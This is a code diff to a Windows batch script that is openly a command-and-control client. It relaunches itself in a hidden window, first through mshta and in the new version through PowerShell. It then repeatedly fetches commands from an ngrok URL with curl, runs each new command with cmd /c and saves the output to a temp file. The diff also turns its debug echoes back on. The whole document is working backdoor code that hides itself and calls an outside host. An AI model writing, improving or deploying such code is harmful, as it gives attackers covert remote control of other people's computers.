@@ -1,33 +1,32 @@
 @echo off
-if "%~1"=="::" (shift & goto :hidden_main)
+if "%1"=="HIDDEN" goto :hidden_main
 
-rem Self-relaunch hidden
-mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run """"%~f0"" ::"", 0:close")
-exit /b
+rem Self-relaunch hidden using PowerShell (more reliable than mshta)
+powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'HIDDEN' -WindowStyle Hidden"
+exit
 
 :hidden_main
 setlocal enabledelayedexpansion
 set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
 set LAST_CMD=
 
-rem Echo removed - no console to see it anyway
-rem echo [*] Starting C2 Client
-rem echo [*] URL: %URL%
+echo [*] Starting C2 Client
+echo [*] URL: %URL%
 
 :loop
     ping -n 3 127.0.0.1 >nul
     
     rem Save raw response for debugging
     curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>nul
-    rem echo [DEBUG] Raw response: - removed
-    rem type %TEMP%\c2_raw.txt - removed
+    echo [DEBUG] Raw response:
+    type %TEMP%\c2_raw.txt
     
     rem Get FIRST non-empty line as command
     set CMD=
     for /f "usebackq delims=" %%A in (`type %TEMP%\c2_raw.txt ^| findstr /v "^$"`) do (
         if "!CMD!"=="" (
             set CMD=%%A
-            rem echo [DEBUG] Got command: !CMD! - removed
+            echo [DEBUG] Got command: !CMD!
             goto :got_command
         )
     )
@@ -38,12 +37,12 @@ rem echo [*] URL: %URL%
     if "!CMD!"=="WAITING" goto loop
     
     if "!CMD!"=="!LAST_CMD!" (
-        rem echo [*] Skipping duplicate: !CMD! - removed
+        echo [*] Skipping duplicate: !CMD!
         goto loop
     )
     
     set LAST_CMD=!CMD!
-    rem echo [*] Executing: !CMD! - removed
+    echo [*] Executing: !CMD!
     
     set TEMPFILE=%TEMP%\c2_output.txt
     cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
